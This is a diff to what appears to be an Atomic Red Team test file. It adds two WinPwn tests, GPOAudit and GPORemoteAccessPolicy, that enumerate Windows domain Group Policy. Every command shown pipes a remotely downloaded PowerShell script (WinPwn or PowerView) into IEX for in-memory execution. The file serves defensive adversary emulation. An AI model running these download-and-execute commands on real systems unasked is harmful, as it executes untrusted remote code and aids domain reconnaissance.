@@ -26,3 +26,23 @@ atomic_tests:
     command: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
     name: powershell
     elevation_required: true
+- name: WinPwn - GPOAudit
+  description: Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      GPOAudit -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - GPORemoteAccessPolicy
+  description: Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      GPORemoteAccessPolicy -consoleoutput -noninteractive
+    name: powershell
